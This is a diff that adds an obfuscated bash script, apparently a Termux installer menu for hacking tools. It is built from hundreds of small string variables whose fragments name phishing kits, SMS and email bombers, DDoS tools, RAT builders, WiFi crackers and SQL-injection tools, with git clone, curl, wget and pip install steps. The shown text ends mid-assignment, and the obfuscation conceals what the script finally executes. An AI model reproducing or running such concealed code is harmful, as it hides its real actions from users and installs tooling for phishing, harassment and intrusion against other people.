@@ -1,3 +1,2636 @@
-z="
-";BCz=']]; ';rTz=' --i';qcz='SQLS';Ehz='SFve';kuz='yTet';FDz='foun';Njz='it-f';adz='ohmy';cjz='rchs';HBBz='ce C';Fdz='e\n"';dGz='to s';Xxz='$set';hgz='ic t';Xwz='eto-';Coz='e)}\';Vuz='lapp';Hhz='veno';cTz='shod';Ugz='r (V';Eaz='82/w';Pmz='2mSt';lFz='ngin';ghz='ewor';Tnz='m)\n';gKz='elp';OGz='ryin';lqz='neth';CWz='e-Wh';qJz='3rf1';Saz='e2';NHz=' to ';djz='reve';WVz='curl';RNz=' Dis';cbz=' --f';Wkz='dose';lvz='i4Yo';rYz=' -h';PABz='3m20';Wiz='webs';oMz='inde';PBBz='us P';wJz=' y |';Hrz='_ent';Ioz='(Byp';yTz='fsoc';hyz=' For';pez='egra';Ysz='2mif';Lz='s/us';jGz='han\';rbz='auto';Uez=')\n"';nZz='n.sh';eFz='====';uyz='] Ne';wHz='he t';sYz='wget';tdz='ing\';IBz='92m]';NTz='trik';bnz='teSp';Xsz='ate_';gIz='ou_w';Jsz='fy t';NMz='it \';wmz='cker';Naz='fite';uuz='john';OOz='2mCl';QNz='m20\';OHz='the\';xwz='lib';qLz='m5\e';aYz='-ins';HOz='irem';KWz='illi';Dhz='c (M';tBz=' [[ ';WHz='m wi';DPz='h';bVz=' php';Yjz='earc';slz='ance';Sjz='/and';vZz='NUX"';vEz='tp:/';XXz='ack_';vqz='l-ne';eZz='w.gi';GWz='Pass';anz='nDoo';Mkz='-Att';Msz='l\n"';abz='cap-';cNz='m24\';Viz='ebsp';fBz='[ $i';ITz='= 14';ABBz='ng\n';pNz=' "$T';hTz='rian';lDz='|_) ';sZz='ifip';dRz='ed p';foz='Temr';eIz='ress';uUz='= 22';Yz='win"';psz='a Fi';Gez='Subl';FCz='ist';Wwz='magn';Piz='rsf.';UBz='ch T';lIz='to o';kxz=' $se';MFz='p 1';Cbz='ass ';QBz='m02\';Zz=' ]; ';cuz='mux!';pABz='] ID';eBz='ts';LVz='uire';fUz='manu';UMz='ider';etz='Spac';bxz='ph_t';Xez='b-Do';rqz='eZWr';gwz='n-ar';lHz='Than';xnz='oidC';ZZz='lueP';Ppz='modi';NFz='ts()';uOz='cd O';Taz='on t';EWz='ou-G';wrz='h_at';bZz='.1.j';QSz='l';oiz='/Wan';BZz='chae';fyz='ols\';xRz='WK.g';rOz='PRec';gdz=' Bla';Thz='Iscr';Hlz='it\n';aoz='buti';fCz='ram ';wlz='e)\n';Vmz='Whit';rhz='Comm';Myz='usly';NABz='3m19';VHz='oble';Cez='tack';jmz='e_Fo';Mqz='l be';gkz='s-Sc';yyz='Syst';Zkz='oS\n';tOz='it';uQz='n\n\';pcz='olki';CTz='4m"';IFz='d No';Plz='S At';Ttz='craw';FEz='\_| ';ixz='t2';EUz='cd f';Abz=' -y ';ECz='ux_l';Usz='_dea';ESz='= 10';SRz='py -';rlz='(Adv';Tpz=' no ';sFz='[0m"';Kwz='Brow';Rez='Clic';wBz='= 1 ';vUz='sand';Nrz=' Tel';lgz='ract';frz='= y ';SFz='0m\e';eaz='Term';Fwz='g Sy';UJz='1 ]]';FQz='Loca';XIz='nue ';rBBz='▓▓▓▒';cqz='= Y ';nNz='eBro';cQz=';77m';tABz='hent';Atz='stem';muz='ll p';ZDz='  | ';haz='ole.';Cqz='Stor';guz='nv i';Tjz='reaf';vaz='tssh';Xz='"Dar';CBz='[1;9';NBBz='o Pr';pbz='ls/m';xmz='pydi';rUz='racc';Prz='oup:';Gwz='Secu';uHz='nks ';LTz='ker';hvz='rget';Ahz='Stit';hkz='ript';pMz='r (L';Ncz='lMap';qkz='trat';QDz='   \';gWz='dlis';CNz='m17\';QHz='ners';ELz='ols_';tmz='(App';NWz=' Tex';CKz='cd k';vMz='ind ';Zxz='rate';gSz='emen';Wyz=' DDO';Xcz='Blis';Jbz='kism';MVz='/osi';rdz='reat';nHz='o \e';Dyz=';93m';Glz='ootk';wRz='D_HA';TUz='scov';sdz='or-P';kyz='3m8\';Hkz='on)\';pGz='our ';tuz='rd A';VRz='it f';hsz='iiDe';jWz='cd W';iVz='_gen';Spz='ice,';enz=' Wif';ubz='./co';tlz='S De';pIz='?"';Elz='Pyth';PJz='m2\e';jSz='= 12';Zoz='x Di';rZz='cd w';Nvz='erSM';JYz='met\';VZz=' jav';hdz='ckPh';tLz='m6\e';rmz='unde';uhz='oit-';Hyz='..."';arz=''\'' ka';nvz='S-Bo';jsz='lDus';Laz='RMUX';yQz='on -';DVz='= 23';Fvz='Sms\';vXz='Wifi';jRz='eros';fnz='ite2';yJz=' Y ]';SZz='0.1.';JABz='3m17';Flz='on-R';iQz='2m'\'' ';Jyz='3m1\';Cnz='Fait';hWz='t-Ge';TOz='tinu';lyz=' Has';eXz='k to';TXz='G.py';KOz='on3 ';mNz='ittl';Umz='10 (';Vaz='te';RXz='t-Yo';GUz='/opt';TBBz='1() ';PPz='p -y';BHz=' mos';Yyz=' fra';oNz='cd L';qCz=' 1';vBz='ut =';Ebz='at';pKz='lipo';xfz='nPle';Ptz='d In';Lcz='ap t';MNz='m19\';cYz='buil';WABz='ore ';GDz='d';GMz='(Pho';wtz='pysn';xQz='ga';upz=' Key';jkz='remo';dPz='on.s';Niz='v -y';bXz='rele';XTz='= 16';ygz='al\n';cGz='ant ';Wrz='t to';eLz='Map ';jQz='numb';rpz='ed)\';Gfz=' You';Dvz='BomB';KVz='/req';TCz='ing ';aDz=' _ \';kpz='roun';Ynz='zy\n';lhz='2mEx';IEz='_/ \';BDz='sh';Qvz='ni_b';HGz='curr';ACz=' 01 ';BABz='3m14';qXz='UI F';ehz='oit ';ytz='ame.';Bgz='cd Y';cVz=' cur';POz='ick ';MSz='spid';Iuz='05/2';MPz='p co';Fpz='\nPr';iiz='/gho';Oaz=' 07 ';pCz='exit';yYz='andr';AJz='2mAn';jdz=' Phi';uez='ify ';akz=' Blu';wjz='k To';RGz=' 100';CMz='ctor';Ytz='game';yUz='andm';Bsz='aph ';pFz='   -';MBz='Cate';hEz='s an';OJz='urf ';kcz='Wide';bez='pixl';Gdz='Zphi';rSz='setu';Ftz='lMed';wcz='Seto';bGz='ou w';ZSz='t/sh';rLz='Drac';Ejz='I ca';rjz='JadX';aaz='Sorr';HABz='3m16';XYz='kin';Dcz='inje';Cfz='r Te';fLz='(nma';lz=' "\n';ikz='s\n"';iyz='ensi';yiz='cle';nXz='h Ho';JVz='pip2';faz='ux!\';ODz='___ ';Onz='am (';ktz='Flap';KRz='ll -';AMz='s in';dSz='herl';RQz='hone';jEz='or!\';UUz='er/';dfz='x OS';PLz='r \n';Eoz='(Hij';kwz='gle-';HJz='2';YEz='n\n"';Ljz='f';tCz='= RE';Lmz='MN\n';MDz='    ';SWz='0 ||';sEz='roup';Mgz=' Gho';Rtz='Debi';DTz='2mPl';EPz='.sh';mSz='l0k/';YBz=' Abo';tWz='obli';GEz='.__/';lbz=' lib';eTz='rang';YMz='k \n';CPz='te.s';lYz='ixie';mBz='2 ]]';OSz='up.p';coz='in A';Mtz='name';wFz='llec';jOz=' -y';oKz=', po';lUz='/evy';nnz='roid';Uaz='su -';Chz='msfp';rnz='h (G';ttz='irme';hHz='san2';JLz='n Ga';lJz='tps:';JRz='ip i';JSz='/rec';oxz='_str';NCz='Good';ORz='s.tx';WNz='m22\';oSz='nfog';LNz='ache';nDz='|  \';Dtz='nd S';kXz='ewps';ZFz=' opt';jnz='droi';ulz='tect';Siz='2.0-';YGz='Ripp';voz='oote';Qfz='ng .';Yqz='[ $k';Bxz='e!\n';Nbz='/mdk';dLz='ork ';sWz='ec/G';ATz=' Sav';amz='ce_a';Nnz='tagr';iqz='ted ';UQz='r yo';Rrz='t.me';Jnz=' fac';Xuz='d.gi';cBBz='= 30';lnz='ckin';mIz='pen ';cHz='m"';GVz='u370';UEz='n200';GLz='2mIn';Ygz='t In';mfz='iews';Ylz='-xss';daz='for ';ibz='l-ge';ILz='atio';Xkz='r\n"';YUz='4m/o';oGz='re y';usz='By F';GGz='ve\n';Yrz='ter ';EVz='OSIF';PUz='disc';dbz='ullh';xHz=' Mem';aBz='m00\';tYz=' htt';wXz='phis';Cuz='05/s';bCz='et t';fMz='m13\';Ekz='od D';hjz='ing_';Uiz='it/w';Itz='erNa';cmz='2mBr';Qkz='n-St';JMz='r in';Dmz='ptur';lEz='mPle';snz='OCK ';spz='{4} ';QABz='b Br';Qbz='pkg-';qmz='a At';jKz='TOR,';atz='mes:';OPz='te!\';uRz='ubhr';GFz='m Co';suz='\nPa';bBz=' Exi';Roz=' Net';sqz='-net';bJz='om G';Eez='Atta';wiz='ep/T';pDz='| |_';oEz='rt t';wIz='hidi';Vhz=' eht';fKz=' --h';Grz=' '\'' i';VXz='less';uABz='icat';txz='w se';Llz='adox';aNz=' OSI';kJz='e ht';Zsz='i De';WGz=' Eng';jgz='Bulk';Noz='P)\n';gMz='onDo';hJz='pwd';sKz='y & ';Vdz='et'\''s';gPz='eets';Hqz='nal ';miz='l.sh';wfz='ck p';Stz='njec';oCz='5';mUz='atar';Ksz='Knoc';hBBz='\n▒▒';Qoz='Kali';Oqz='to d';iABz='3m24';gz='ue';PBz='"';Lrz='n as';pyz='heri';kCz='me/l';ALz='ion_';nlz='XanX';qWz='tor ';qwz='-aut';cEz='() {';WBz='n"';sNz='e ];';Baz=' 06 ';qlz='rike';paz='apt-';jjz='vers';Sdz='e (G';AVz='ap';diz='it -';Xbz='l-3-';iXz='pkin';sTz='p $i';yZz='wifi';Nlz='xss_';jMz=' Str';YVz='t -y';SKz='ulti';WEz='1;92';TMz='onSp';ZABz='base';nSz='it i';EIz='.me/';lNz='05/L';CLz='erin';rIz='/n):';igz=':\n"';ahz='DER\';UNz=' Rac';Xpz='om r';Qez='so F';Qiz='k_L';aSz='erlo';fWz='/Wor';fRz='n2.7';Dsz='URL\';onz='MySM';Bhz='ch\n';FSz='nSpi';Iyz=' [\e';REz='95m@';vHz='to t';MCz='\n\n';Dnz='agra';tDz=' _ <';Drz='ible';Hez='ist3';Phz='Droi';Nez='kURL';cnz=' Plu';nTz=' Add';UWz='cupp';qiz='ang/';Riz='glib';udz=' Nex';eHz='d by';lOz='s_en';OEz='6mCo';KCz='= 0 ';Yvz='et: ';IWz='t (1';TRz='n $n';mhz='amew';avz='er_i';Isz='Veri';nkz='mote';uJz='.git';unz='Wish';SSz='der.';xYz='com/';tjz='ddos';UFz='7m~\';nBBz='\n▓▒';gYz='ld-e';Xlz='nded';boz='ons ';HNz='anne';qtz='keGa';bdz='qr (';ySz='File';jpz='on(A';iIz='to_o';xkz='Powe';qrz='fy';qABz='3m28';QWz='rd)}';SOz=' con';gpz='net ';ppz=' be ';jABz='(RAT';gtz='oter';Wsz='ntic';mOz='ter';toz='ock,';yuz='ssag';dxz='mUSE';FZz='ot/r';xXz='her\';fGz='st m';UHz='y pr';bfz='fy.p';LYz='3\n"';cyz=' Ema';Ndz='usin';tMz='danf';Mfz='ramS';Zdz='s)\n';Qtz='or:\';FIz='linu';PQz='kavu';Vpz=' or ';xTz='= 19';pQz=' tak';Hiz='oute';esz='er-N';Ilz='oRAT';pXz='ot G';OIz='birH';hrz='2mRu';NQz='/abh';vSz='nDog';Rsz='Hash';saz='ss n';BRz='mv c';yxz='your';vdz=' Adv';IBBz='3m34';TTz='nder';bPz=' use';IKz='ler.';brz='li_r';Gz='data';Tcz='i Sc';jLz='Reco';eMz='T \n';pjz='Apk2';lez=' Pay';Gcz='2mSQ';qMz='ike:';qvz='omB';mLz='ame ';taz='etca';eGz='ugge';sBz='u';Gnz='albr';Suz='ke';yABz='3m31';lXz='Blue';LXz='You-';Zqz='ali_';Mwz='TG_b';Lez='der)';XZz='ar b';LRz='r re';twz='b2 g';aRz='/xer';nqz='r-te';XUz='s \e';DLz='g_to';Jgz='itat';xEz='e/li';Csz='ck:\';VJz='Down';kHz='ial ';ldz='g.Da';MOz='lebr';nYz='cd p';npz='fs f';VSz='lock';FGz='e ha';sOz='on.g';vYz='/git';ZHz=' tha';iWz='nera';phz='erSp';pJz='/Und';eNz='onaS';Mxz='mTEL';rGz='s on';Ggz='2mPo';pdz='Hunt';Cyz='ist(';BNz='n) \';riz='k';rEz='am G';HKz='stal';oWz='inWo';Utz='b cr';OCz=' Bye';kOz='pres';pwz='ogle';gcz='L in';uXz='ion\';OLz='othe';jYz='/wii';Ssz='-Bus';bEz='ndle';Icz='ject';MUz='om/l';Twz='urce';SPz='p';eyz='erif';NYz='c\n"';vtz='txt';Gaz='e/ma';bz='MAC=';qQz='e a ';jez='oads';jaz='/the';Gtz='ia B';Lqz='.3GB';fTz='3r f';yrz='N Ho';MABz='] Ph';Rhz='Enig';VQz='ur p';oOz=' Git';omz='cial';Rdz='hees';Tlz='XSS-';qnz='Lock';fJz='ng t';Cpz=' war';Aaz='her';OFz='read';eUz=' it ';DZz='th/b';aJz='f fr';fQz='93m ';Tz=' [ "';dCz='in T';wvz='medi';ETz='ease';vNz='all ';tiz='it-F';Yez=' Tak';STz='etFi';fVz='et -';Az='if [';fYz=' bui';mxz='bot_';cSz='cd s';imz='ll\n';yHz='bers';EHz='ls a';RRz='oga.';LIz='gith';Quz='ke -';iaz=' 09 ';rxz='done';QGz=' get';aFz='ion:';syz='3m11';kQz='2m T';bMz='- Em';Alz='ll-R';dJz='b ..';gVz='word';YCz='\nDo';IQz='cati';kKz=' net';YBBz='= 26';pnz='S\n"';ZQz='nati';JEz='_|  ';Luz='048';hOz='hon3';Kkz='CC-a';kmz='rce ';gEz='e wa';ywz=' com';Ouz=' nsn';vRz='a/RE';Huz='ky.p';qgz='2mPa';vpz='boar';CCz='show';Ciz='chsp';Yaz='omiR';oDz='91m\';ylz=' ezX';nsz='er_L';tEz=': \e';clz='ende';BTz='ed t';ASz='ED_H';JGz='y 50';iMz='m14\';MTz='cd S';Lbz='n ]]';TPz=': ht';rkz='or T';wgz='at\n';Cz='REFI';qxz='My w';bcz=' Tim';mJz='//gi';Crz='poss';VKz='y ||';cMz='ail ';Gbz='rack';kEz='n\e[';Xdz='cam ';dUz='\nPl';ddz='ode ';GRz='fig.';Gqz='GB I';wuz='agin';nVz='st G';Ydz='Shot';Gvz='C-Sp';Hvz='amMa';JBBz='] Ga';vsz='acia';APz='.sh ';VMz='m11\';Hpz='uisi';Krz='u ca';PGz='g to';RUz=' /op';Fnz='igha';tz='{';Oez='Blaz';UKz='git';dBBz='= 31';Moz='or I';PVz='Coro';tNz='pkg ';Vjz='ldi/';swz='tpli';Rz='rue';Bfz=', Fo';kBz='put ';SMz=' Rec';efz='YouT';Rbz='conf';tRz='insh';olz='SS\n';GOz='requ';Pkz='Rave';urz='homo';dDz='_ __';QKz='mstr';lZz='./fl';qYz='e in';Apz='hout';qfz='!\n\';hGz='y to';maz='fast';ctz='akeG';bwz='ch-B';WDz=' _(_';TABz='3m99';Wxz='_bot';Wgz='e - ';vLz='oLoc';Cgz='bot.';hXz='-Pum';exz='R_SE';GPz='& In';ujz='2mDD';Jjz='/bee';Pyz=' And';vOz='on';XABz='3m00';CHz='t of';Qz='UX=t';RWz='k\n"';gTz='/flo';dvz='er.p';XBz='m03\';uDz=') | ';Waz=' 08 ';Fgz='_exp';CQz='ion';dHz='Code';Wqz='l_pe';YABz='] Ba';YJz='-ano';SLz='(Com';ecz='blin';TNz='m21\';oQz='will';dQz='*\e[';GXz='/SMW';DHz=' too';wTz='cher';SCz='r Us';pmz='Medi';drz='ermi';ARz='y';bRz='ospl';Tyz='tefo';HCz=' 03 ';Pxz='OKEN';YOz='nter';yjz='cron';Mz='r" ]';Tdz='rab ';oPz='issi';fABz='] Pa';IPz=' nma';kaz='xcho';MJz='mous';Esz='emai';aBBz='= 28';FBz='1;96';XCz='8';wsz='l Re';bWz='-Gen';isz='Pixe';DBBz='] Te';fqz='mit ';Dkz=' Flo';GCz='= 3 ';erz='run_';nABz='] St';JTz='Stri';Muz='-ter';tXz='Flux';Xaz='/Shl';kMz='iker';lkz='dmin';qPz='..\n';uYz='ps:/';ivz='t cu';liz='host';vCz=' the';lwz='api-';Nqz='d\n\';Wcz='o\n"';Jkz='et\n';lTz='ang3';tvz='star';Sbz='ig l';BUz='05/f';yz='prin';YDz='_   ';VNz='coon';cPz='rrec';Amz=' xss';uxz='tup ';fvz='ser_';SDz='| __';Arz='ux';wPz=' ./D';ksz='alMe';Kuz='cd 2';Wdz=' Web';MXz='Got';iez='payl';PIz='asan';Bcz='ver ';uNz='inst';Xtz='Gosp';QXz='-Wha';FFz='1;91';xhz='beef';wKz='cks ';BEz='|_|\';jrz='g as';gRz=' & r';xDz='|\__';uPz='cnma';DCz='_lin';VPz='= 4 ';RYz='/WiF';Yoz='ify(';tcz='2mPh';uoz=' unr';hbz='libn';xMz=' Usi';Vqz='i_in';Edz='enEy';mMz=' Sec';Aqz='on P';hcz='Levi';Dz='X" =';pxz='sess';YIz='to E';ftz='eSho';HLz='form';KFz='und!';Tez='king';Ycz='qy -';jbz='nl-3';uVz='tor\';xIz='ng_t';srz='kify';OZz='tar ';fjz='engi';LWz='on C';ohz='Rout';gyz='3m7\';cDz=' _ _';lSz='/m4l';jz=' '\''pr';fhz='Fram';Hwz='rity';lRz='hon2';xez='b Pa';Vvz='cd b';mqz='unte';viz='/mdi';hz='fi';Bkz='func';KLz='ther';gFz=';95m';JZz='n/bl';XJz='kali';gfz='View';IHz=' fro';DMz=') \n';ZYz='sh -';cRz='oit.';Bnz='rcer';aPz='cd U';eSz='ock';Vrz=' wan';TEz='Hasa';PKz='/tri';Fez='ck\n';Kqz='nd 1';Uuz='05/F';vz='r';stz='me';jTz='shev';qbz='foc';gqz='== y';LPz='Setu';hez='oad)';oFz=' \n"';xpz='aila';OBBz='evio';ncz='Audi';rKz='ivox';wABz='] So';Guz='_roc';HHz='cted';wxz='ings';Eqz='Arou';xZz='rue ';YRz='/Lio';bFz=' \e[';Fyz='es L';hiz='ySec';qFz='----';qez='m Me';yCz=' eng';IGz='entl';tyz='3m12';fOz=' apt';xABz='3m30';Pcz=' (Da';Upz='root';Rfz='cd T';Oz='en';gbz='fig ';Ckz=' SYN';ZWz='-h';RZz='pot-';sbz='nf -';nhz='orks';Acz='er -';cABz='3m21';yFz=' of ';Fz='ata/';yhz='Meta';RMz='m10\';OTz='stri';hIz='ant_';CZz='lsmi';luz='ris';tZz='hish';mCz='_rep';MWz='lear';OMz='m9\e';ERz='ampl';ljz='gine';otz='05/P';Scz=' SQL';XHz='th a';Qlz='DalF';kfz='ouTu';gNz=' Bac';Ldz='u (G';wyz='3m13';gBz='nput';Evz='Spam';QQz='ri/P';HVz='/OSI';hVz='list';Zbz='libp';aGz='If y';lKz='cat,';Kjz='fpro';tPz=' Dra';Ymz='brut';Dbz='netc';WKz='== Y';kjz='e en';awz='-Lee';Sfz='scra';kFz='   E';naz='ssh';KABz='] SQ';QFz='$'\''\n';okz=' Adm';uIz='ymou';Znz=' Ope';Kyz=' Ano';gXz='WiFi';Zjz='hspl';az='then';BJz='onym';FTz='up m';trz='idn_';AYz='te2\';YNz='dmap';bYz='s_L';Qsz='sh c';qZz='iphi';smz='rhan';Iqz='age\';Smz='hy t';kvz='/Bha';pWz='rdGe';tGz='Tele';FPz=' git';wSz='/s0m';Svz='/iMr';Cwz='OS_t';uCz=' ]];';Tmz='snow';dMz='OSIN';NNz=' fso';Jz='mux/';lQz='his ';hQz='mber';Wz='" = ';pPz='on .';kdz='shin';KHz='tHub';hDz=' / _';Dqz='{5} ';thz='ghos';Woz='id)\';BMz='fo c';mGz='e to';jBz=' $in';CRz='onfi';Uvz='3r.g';IOz='ents';AFz=';92m';kVz='ors_';vfz='n so';Xrz='i ne';NIz='om/A';SEz='Abir';lfz='be_V';jPz='map.';iNz='/Abi';hnz='oid_';qRz='= 9 ';Ufz='adde';Dwz='Oper';WRz='rom ';qz='main';qHz='su\e';Xoz='Desk';Gpz='ereq';ewz='agne';bUz='ver\';dgz='_too';fmz='acks';MGz='we a';iYz='tial';ysz='n Sy';Egz='post';MBBz='ck t';Jez='ubDo';Pvz='ber\';mkz='istr';SUz='t/di';ycz='alFi';jfz='05/Y';ajz=' cve';IZz='r/bi';mFz='e Ri';MZz='1.ta';BXz=' 04 ';oz='xit ';JQz='on.p';Euz='shoo';EKz='d +x';mz='";st';lcz=' Ran';Rmz='ogra';Klz=' par';uGz='gram';Rgz='Hera';eez=' Att';Omz='rahy';bSz='ck.g';Foz='Sess';dmz='utef';Iz='.ter';ekz='mmer';wUz='map ';aHz='n te';hRz='on2 ';SABz='r To';Mlz='ia\n';JKz=' sta';KMz='m8\e';nMz='retF';Nsz='hash';Fxz='nual';HRz='py';ucz='ishi';JXz='Me-W';IUz='r/ f';IVz='F';ocz='t To';YPz='serR';Kdz='e_Yo';Lyz='nymo';Rvz='ombe';dTz='= 17';lmz='(All';MHz='anks';Mmz='steg';ZTz='anfy';Osz='_cra';VABz='ow M';kYz='re/p';rVz='Cupp';CEz='___|';gOz=' pyt';Brz='alla';Rnz='ool ';vmz=' Che';ZPz='econ';FABz='3m15';RLz='con ';blz='(Ext';Uz='$(un';yPz='/mal';uqz='ermu';Ccz='sql_';Biz='it F';iJz='git ';Ghz='tor)';Uqz=' kal';nbz='/nfc';jBBz='▒ Lo';kNz='an20';iUz='= 21';rBz='hp';LUz='one ';Hsz='2mEm';prz='eski';bBBz='= 29';Pez='y(Al';uz='clea';odz='gKit';Maz='./wi';fez='ack ';Doz='App ';lMz='m15\';ffz='ube_';oYz='make';kqz='all-';CJz='ousl';DYz='Fast';CYz='Twin';oXz='neyp';NZz='r.gz';Hxz='t he';Xyz='3m5\';Fmz='sion';Fuz='ter.';GIz='x_re';yIz='_L()';dVz='l gi';iRz='cd x';orz='05/D';aXz='2mWi';FOz=' -r ';Ijz='at.\';vrz='grap';hYz='ssen';xCz='bash';GABz='] Wo';Oiz='ll b';sz='u() ';Giz='ters';sDz=' __/';vkz='pupy';xlz='RVul';Dez='Web2';Nfz='crap';ZMz='m12\';oJz='.com';ojz='rd\n';sez='rapp';IMz='umbe';ssz='r (F';pVz='ator';PSz='y in';HWz=' lis';BWz='ow-M';Tbz='ibnl';Lgz='le -';lrz='t us';JFz='t Fo';RBz=' Ter';XVz=' wge';fcz='d-SQ';VIz='to c';FJz=' Too';Buz='esho';OBz='es\n';sMz='m16\';DIz='://t';xgz='Brut';rwz='h-ht';RIz='om/P';wZz=' = t';QIz='2005';mVz='rdli';rez='s Sc';Mhz='Spyc';LKz='cd .';KTz='ker ';Miz='0-de';LFz='\n"';goz='ux O';yXz='te\n';Wbz='-gen';BKz='hen';dez='(Web';AKz=']; t';EDz='not_';aTz='.py ';JIz='ub: ';ZNz='m23\';pgz='crea';ZLz='ocat';ANz='hoda';BYz='Evil';ZKz='./se';FKz=' *';RVz='ats ';Lpz='Devi';chz=' Met';eQz='2m]\';WBBz='21 ]';wEz='/t.m';Vxz='[ $s';qBz='ch.p';TQz='Ente';uiz='k.py';XPz='05/U';rz='_men';RCz='s Fo';Adz='sh\n';wGz='up.\';ZXz=') {';PHz='s ow';PTz='ker.';Zfz='cd V';tnz='PIN)';GQz='ip2g';qhz='WebS';HQz='eolo';scz='hing';Rcz='mall';qEz='legr';rFz='-\n"';Clz='RAT-';MEz='|   ';buz='n in';PMz='RED ';RHz=' for';vwz='e-au';xcz='Soci';ukz='Pysh';Hoz='loud';eKz='mult';YLz='GeoL';yfz='wait';Qhz='d\n"';qNz='ERMU';mPz='oot ';Paz='/der';sjz='Apkt';dKz='ll';vABz='3m29';XWz='upp';yez='ge V';Hbz='-ng ';Aoz='ure ';xVz='ordG';Ukz='webd';ePz='= 5 ';Gkz='Weap';Byz='ter(';hKz='l ne';yNz='it w';EBz='[\e[';VDz='  __';nFz='pper';Ifz='_Vie';UDz=' __ ';eVz='t wg';evz='y $u';eEz=';91m';dsz='Jamm';wYz='hub.';cpz='VNC ';TYz='mpki';KXz='hat-';Zuz='Can'\''';wez='o We';woz='d An';gaz='cons';CGz='ux &';LBz='ols ';mdz='taba';UOz='er .';uWz='nWor';XRz='ub .';bgz='fore';USz='Sher';cJz='itHu';EXz='alma';alz='rch ';xPz='= 6 ';oABz='3m27';Jpz='{1} ';Uhz='ipt\';tQz='nts ';XSz='k-pr';rQz='few ';wOz='on w';osz='2mSo';lsz='dia_';ZBz='ut\n';Juz='048.';rHz='2m\n';ijz='2mRe';Lvz='YetA';Ziz='roje';Wlz='exte';WMz=' She';Vtz='awli';ZRz='nSec';Ktz='alsc';wVz='in W';GNz='t Sc';gLz='p) \';Sez='kJac';yaz='h.sh';dz='else';Skz='Over';Oxz='PH_T';IIz='GitH';Mez='Chec';Ulz='LOAD';TVz='oron';pHz='alah';uEz='6mht';LDz='__  ';UABz='] Sh';cez='oad ';jyz='c to';FXz='niar';Iiz='rspl';xaz='stss';Rjz='chSp';Wtz='ng:\';CDz='comm';Ucz='r)\n';Psz='2mHa';Zpz='ery ';itz='nsna';vbz='nfig';ugz='The ';Rwz=' Bot';qqz='/2Mc';iKz='eds ';BSz='AWK';EABz='ty T';Imz='ng-S';VWz='/Meb';OQz='inav';bbz='mdk4';yqz='term';mez='Scra';nIz=' & c';IABz='] Wi';uMz='y (F';Qpz='fied';vJz='n ==';NVz='f.py';MMz='splo';PEz='ded ';ccz='e-ba';VYz='iFi-';tbz='is';Vyz='3m4\';rfz='92mT';ybz='reav';Wez=' (Su';Fiz='/rou';dtz='ame\';tkz='T):\';xyz='] Op';SBz='mux ';Nxz='EGRA';HYz='k-ng';NGz='re t';MYz=' mfo';YYz='er.s';TLz='bina';bTz='nfy';Ihz='m (V';dFz='t() ';cfz='Linu';Mrz='k in';XNz=' san';kIz='Do y';umz='lica';Lsz='kmai';EJz='ding';Gsz='rify';Jvz='TBom';Ibz='apt ';ryz='] Me';aMz=' Inf';kbz='-dev';aVz='onas';cWz='or f';Qmz='egan';uSz='= 13';AIz='.\n"';HIz='po\e';TWz='0 ]]';jvz='rl -';fbz='-con';aqz='all_';ZEz='erro';Wmz='espa';iLz='User';Lhz='de G';cKz='nsta';Kfz='ot\n';fHz='m@Ab';PYz='/P0c';vIz='sly_';xxz=' by ';eJz='Savi';RBBz='in M';LCz=' 00 ';IXz='how-';uKz='xy-t';TSz='= 11';DABz='curi';Zyz='mewo';FUz='= 20';SIz='Pres';RFz=';31m';Hjz='h th';xLz='P Ad';tTz='_ip';Vgz='egil';nWz='rato';inz='hack';Olz='2mXS';fBBz='= 34';vVz='Gobl';obz='-too';VLz='einF';MIz='ub.c';kz='intf';Cxz='Now ';qSz='cd i';Bmz=' Fla';WLz='oga ';Zgz=' The';msz='find';Ivz='sal\';DBz='2m"';lWz='ist-';sBBz='▓▓▓▓';cLz='Netw';PNz='y \n';eCz='eleg';pBz='sear';bIz='6m '\''';Hfz='Tube';bqz='it =';qDz='__| ';Trz='ux_r';Asz='mogr';Tvz='o0t/';Fhz='nom ';tHz=' Tha';xSz='d3v/';TIz='s EN';PWz='sswo';mXz='toot';sSz='p.py';kGz='Feel';RTz='Secr';fgz='2mFo';Cjz='uall';Pgz='e Sh';gxz='N_ST';nwz='lien';mgz='or\n';fZz='/Flu';ypz='ble ';fXz='ols:';Tqz='3m '\''';GSz='der ';Odz='g ph';Slz='r of';krz=' roo';ruz='pass';NJz='ly S';UBBz='= 99';NDz='   _';rtz='me.g';gmz='aBru';Goz='HatC';Auz='spac';SXz='u-Go';DNz=' ran';Dfz='rmux';Shz='ma\n';xBz='|| $';GTz='anua';Vez='take';mrz='er!\';hFz='  Ab';nrz='nh -';Vz='ame)';XOz='ck_e';uaz=' fas';eBBz='= 32';kTz='ci/r';JHz='m Gi';mZz='uxio';baz='y, T';RDz='92m\';IJz='1;93';flz='arch';KNz=' Bre';jCz='//t.';BLz='gath';JNz='m18\';Vkz='os-d';Qcz='mn S';rABz='fi D';htz='2048';Gmz='-Hij';utz='nts.';Daz='derv';Zcz=' Exp';Ojz='/rap';Hz='/com';xbz=' && ';XKz='cd m';Bqz='lay ';ouz='e';HDz='}';uZz='"$LI';EEz='| \_';HXz='YG-S';mRz='.py';Fsz='l_ve';lPz='ed r';uFz=' is ';hUz='!\n"';hhz='expl';cXz='ss a';Tsz='ter\';oaz='asts';gnz='teDu';XDz=')_ _';Etz='ocia';Vsz='uthe';Ez=' "/d';WYz='Pump';jwz=' goo';biz='ommi';AWz='G-Sh';Qaz='v82/';Eyz='Show';Qrz='p://';EOz='tall';Vcz='Expl';Bpz=' voi';KQz='y --';fIz='do_y';Uwz=' Cod';YHz='ny\n';Poz='oit\';xuz='\nMe';cOz='= tr';tIz='anon';NSz=' set';yWz='gobl';Cvz='SmS-';qKz=', pr';GBBz='Sour';Mbz='/air';nRz=' xer';fNz='tats';tVz='Crea';BPz='upda';Mdz='et L';Dpz='rant';aUz='isco';mcz='ge M';Ogz='n Th';kBBz='adin';mjz='Andr';joz='li N';eOz='sudo';yMz='ng S';Qyz=' Hac';nQz='ess ';DDz='and_';JWz='.4 B';TGz='ools';CVz='up.s';Duz='pace';xqz='ter-';SVz='05/C';sCz=' || ';Rpz=' dev';wNz='pyth';KJz='2m] ';giz='/Ent';AZz='ewmi';ltz='pyBi';sxz='. No';Kez=' Fin';Avz='bomb';Ruz='ake';aABz='1';icz='atha';JPz='p ..';kDz=' \ /';OKz='= 2 ';hpz='conn';YWz='cd c';qdz='er\n';LLz='s: \';GYz='crac';oUz='d/Ra';mwz='on-c';pBBz='▓▒▒▒';Zez='eOve';ejz='rse_';huz='flap';xOz='chom';gQz='r Nu';VEz='5\e[';Iez='r (S';vDz=' |  ';VBBz='2() ';LEz='_/  ';XQz='ber ';Okz='OVH-';CXz='ot 